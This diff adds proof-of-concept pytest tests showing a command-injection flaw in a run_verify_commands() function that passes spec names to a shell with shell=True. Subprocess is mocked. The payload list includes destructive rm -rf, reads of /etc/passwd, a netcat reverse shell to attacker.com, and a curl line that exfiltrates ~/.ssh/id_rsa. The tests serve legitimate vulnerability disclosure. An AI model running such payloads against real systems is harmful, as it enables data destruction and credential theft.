@@ -411,6 +411,168 @@ class TestRunVerifyCommands:
             # The malicious command is present in the rendered command
             assert "; echo" in result[0]["command"]
 
+    def test_run_verify_commands_command_injection_with_malicious_spec(self) -> None:
+        """
+        PROOF-OF-CONCEPT: Demonstrates command injection vulnerability with malicious spec names.
+
+        This test demonstrates how a malicious spec name can lead to command injection
+        when using shell=True in subprocess.run(). The vulnerability exists in the
+        run_verify_commands() function where the spec parameter is directly interpolated
+        into the command string without proper sanitization.
+
+        Attack scenarios demonstrated:
+        1. Command chaining with semicolons
+        2. Command output redirection
+        3. Background process execution
+        4. Command substitution
+
+        Expected behavior: These tests should PASS, demonstrating the vulnerability exists.
+        After the fix: These tests should FAIL or be updated to verify proper sanitization.
+        """
+        # Mock subprocess to capture what would be executed
+        mock_proc = MagicMock()
+        mock_proc.returncode = 0
+        mock_proc.stdout = "legitimate output"
+        mock_proc.stderr = ""
+
+        malicious_payloads = [
+            {
+                "spec": 'valid-spec; rm -rf /tmp/important_files',
+                "description": "Command chaining with destructive command",
+                "expected_in_command": "; rm -rf",
+            },
+            {
+                "spec": 'valid-spec && cat /etc/passwd > /tmp/stolen',
+                "description": "Command chaining with AND operator and data exfiltration",
+                "expected_in_command": "&& cat",
+            },
+            {
+                "spec": 'valid-spec || curl malicious.com/steal?data=$(whoami)',
+                "description": "Command chaining with OR operator and data exfiltration via command substitution",
+                "expected_in_command": "|| curl",
+            },
+            {
+                "spec": 'valid-spec; echo pwned > /tmp/pwned.txt',
+                "description": "File write for persistence or proof of exploitation",
+                "expected_in_command": "> /tmp/",
+            },
+            {
+                "spec": 'valid-spec & malicious_background_process',
+                "description": "Background process execution",
+                "expected_in_command": "& malicious",
+            },
+            {
+                "spec": 'valid-spec; touch /tmp/I_WAS_HERE',
+                "description": "File creation as proof of exploitation",
+                "expected_in_command": "; touch",
+            },
+            {
+                "spec": 'valid-spec`whoami`',
+                "description": "Command substitution using backticks",
+                "expected_in_command": "`whoami`",
+            },
+            {
+                "spec": "valid-spec$(id)",
+                "description": "Command substitution using $() syntax",
+                "expected_in_command": "$(id)",
+            },
+            {
+                "spec": "valid-spec| nc attacker.com 4444",
+                "description": "Pipeline to network connection for reverse shell",
+                "expected_in_command": "| nc",
+            },
+            {
+                "spec": "valid-spec; export EVIL='pwned'",
+                "description": "Environment variable manipulation",
+                "expected_in_command": "; export",
+            },
+        ]
+
+        for payload in malicious_payloads:
+            with patch("subprocess.run", return_value=mock_proc) as mock_run:
+                malicious_spec = payload["spec"]
+                description = payload["description"]
+                expected_substring = payload["expected_in_command"]
+
+                # Run verify commands with malicious spec
+                result = run_verify_commands(
+                    ["pytest --spec={spec}"],
+                    malicious_spec
+                )
+
+                # Verify the vulnerability
+                assert len(result) == 1, f"Failed for payload: {description}"
+
+                # Verify shell=True is used (enables the injection)
+                assert mock_run.called, f"subprocess.run not called for: {description}"
+                call_kwargs = mock_run.call_args[1]
+                assert call_kwargs.get("shell") is True, \
+                    f"shell=True not set for: {description}"
+
+                # Verify the malicious payload is present in the rendered command
+                rendered_command = result[0]["command"]
+                assert expected_substring in rendered_command, \
+                    f"Malicious payload '{expected_substring}' not found in command: {rendered_command}"
+
+                # Verify the spec placeholder was replaced
+                assert "{spec}" not in rendered_command, \
+                    f"Placeholder not replaced for: {description}"
+
+                # Verify the legitimate part is still present
+                assert "pytest --spec=" in rendered_command, \
+                    f"Legitimate command missing for: {description}"
+
+    def test_run_verify_commands_injection_impact_demonstration(self) -> None:
+        """
+        PROOF-OF-CONCEPT: Demonstrates the potential impact of command injection.
+
+        This test shows what an attacker could achieve by exploiting the command
+        injection vulnerability in run_verify_commands(). While we mock subprocess
+        to prevent actual execution, we demonstrate that the malicious commands
+        would be executed with shell=True.
+
+        CVSS Score Estimate: 9.8 (Critical)
+        - Attack Vector: Network (spec names from user input)
+        - Attack Complexity: Low (simple shell metacharacters)
+        - Privileges Required: Low (any user who can create specs)
+        - User Interaction: None
+        - Impact: High (complete system compromise)
+        """
+        mock_proc = MagicMock()
+        mock_proc.returncode = 0
+        mock_proc.stdout = ""
+        mock_proc.stderr = ""
+
+        # Simulate a realistic attack scenario
+        # Attacker creates a spec named with a malicious payload
+        attacker_spec = 'project; curl http://attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)'
+
+        with patch("subprocess.run", return_value=mock_proc) as mock_run:
+            # The system tries to run verification commands
+            verify_commands = [
+                "pytest {spec}",
+                "npm test -- --grep {spec}",
+            ]
+
+            results = run_verify_commands(verify_commands, attacker_spec)
+
+            # Both commands would be vulnerable
+            assert len(results) == 2
+
+            # Verify both calls used shell=True
+            assert mock_run.call_count == 2
+            for call in mock_run.call_args_list:
+                kwargs = call[1]
+                assert kwargs.get("shell") is True, "shell=True enables injection"
+
+            # Verify the exfiltration payload is present in both commands
+            assert "curl http://attacker.com" in results[0]["command"]
+            assert "curl http://attacker.com" in results[1]["command"]
+
+            # Verify command substitution payload is present
+            assert "$(cat ~/.ssh/id_rsa)" in results[0]["command"]
+            assert "$(cat ~/.ssh/id_rsa)" in results[1]["command"]
+
 
 # ============================================================================
 # Auto Commit Tests
